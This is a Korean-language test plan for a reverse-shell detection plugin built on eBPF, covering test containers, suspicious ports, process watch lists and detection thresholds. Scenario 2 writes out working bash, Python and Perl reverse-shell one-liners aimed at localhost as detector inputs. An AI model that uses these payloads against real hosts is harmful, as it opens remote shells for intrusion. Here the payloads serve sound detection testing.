# Reverse Shell Plugin Test Scenarios

이 문서는 `reverse_shell.rs` 플러그인의 테스트 시나리오를 설명합니다.

## 테스트 환경 구성

### 1. reverse-shell-plugin-test (메인 플러그인 테스트 컨테이너)
- **역할**: `reverse_shell.rs` 플러그인 실행 및 테스트
- **기능**:
  - eBPF 기반 커널 후킹
  - 실시간 이벤트 탐지
  - 플러그인 기능별 테스트 실행
  - 탐지 결과 수집 및 분석

### 2. reverse-shell-targets (타겟 서버 컨테이너)
- **역할**: 의심스러운 포트에서 리스너 실행
- **기능**:
  - 9개 의심스러운 포트에서 리스너 실행
  - 플러그인 테스트용 연결 수신
  - 다양한 리버스 쉘 패턴 시뮬레이션

### 3. plugin-monitor (플러그인 모니터링 컨테이너)
- **역할**: 플러그인 활동 실시간 모니터링
- **기능**:
  - 네트워크/프로세스 상태 확인
  - eBPF 프로그램 상태 확인
  - 시스템 리소스 모니터링

## 테스트 시나리오

### 시나리오 1: 의심스러운 포트 연결 탐지
**목적**: 알려진 리버스 쉘 포트로의 연결 탐지

**테스트 포트**:
- 4444 (Netcat 기본 포트)
- 1337 (Leet 포트)
- 31337 (Back Orifice 포트)
- 9001, 9002 (Python 리버스 쉘 포트)
- 6667, 6668, 6669 (IRC 포트)
- 8080 (HTTP 대안 포트)

**예상 결과**: `EventType::SuspiciousConnection` 이벤트 생성

### 시나리오 2: 리버스 쉘 패턴 탐지
**목적**: 다양한 리버스 쉘 패턴 탐지

**테스트 패턴**:
1. **Netcat 리버스 쉘**:
   ```bash
   bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
   ```

2. **Python 리버스 쉘**:
   ```python
   import socket,subprocess,os
   s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
   s.connect(('127.0.0.1',9001))
   os.dup2(s.fileno(),0)
   os.dup2(s.fileno(),1)
   os.dup2(s.fileno(),2)
   subprocess.call(['/bin/sh','-i'])
   ```

3. **Perl 리버스 쉘**:
   ```perl
   use Socket;$i="127.0.0.1";$p=9002;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};
   ```

**예상 결과**: `EventType::ReverseShellDetected` 이벤트 생성

### 시나리오 3: 외부 연결 탐지
**목적**: 프라이빗 네트워크 외부로의 연결 탐지

**테스트 대상**:
- 8.8.8.8 (Google DNS)
- 1.1.1.1 (Cloudflare DNS)
- 208.67.222.222 (OpenDNS)

**예상 결과**: `EventType::NetworkAnomaly` 이벤트 생성

### 시나리오 4: 의심스러운 프로세스 탐지
**목적**: 의심스러운 프로세스 실행 탐지

**테스트 프로세스**:
- netcat (nc)
- wget
- curl
- python3
- perl

**예상 결과**: `EventType::ProcessInjection` 이벤트 생성

### 시나리오 5: 커널 후킹 기능 테스트
**목적**: eBPF 커널 후킹 기능 검증

**테스트 내용**:
- XDP 프로그램 로드 확인
- Tracepoint 프로그램 로드 확인
- eBPF 맵 초기화 확인
- 커널 이벤트 처리 확인

**예상 결과**: `EventType::KernelHookTriggered` 이벤트 생성

## 모니터링 지표

### 네트워크 모니터링
- `/proc/net/tcp` 파일 분석
- `/proc/net/tcp6` 파일 분석
- 네트워크 연결 상태 확인
- 포트별 연결 통계

### 프로세스 모니터링
- 실행 중인 프로세스 목록
- 의심스러운 프로세스 패턴 매칭
- 프로세스 생성 이벤트 추적

### eBPF 모니터링
- eBPF 프로그램 상태 확인
- 커널 모듈 로드 상태
- eBPF 맵 상태 확인
- 이벤트 전송 상태

### 시스템 리소스 모니터링
- CPU 사용률
- 메모리 사용률
- 네트워크 대역폭
- 디스크 I/O

## 성공 기준

### 탐지 정확도
- 의심스러운 포트 연결 탐지율: > 95%
- 리버스 쉘 패턴 탐지율: > 90%
- 외부 연결 탐지율: > 98%
- 의심스러운 프로세스 탐지율: > 85%

### 성능 기준
- 이벤트 처리 지연시간: < 100ms
- 메모리 사용량: < 100MB
- CPU 사용률: < 10%
- 네트워크 오버헤드: < 1%

### 안정성 기준
- 24시간 연속 실행 안정성
- 메모리 누수 없음
- 크래시 없음
- 정상적인 정리 및 종료

## 테스트 실행 방법

```bash
# 전체 테스트 실행
./tests/scripts/run_tests.sh

# 개별 컨테이너 테스트
docker-compose -f tests/docker/docker-compose.yml up --build

# 플러그인 직접 테스트
cd agent/linux_agent
cargo run --example plugin_test
```
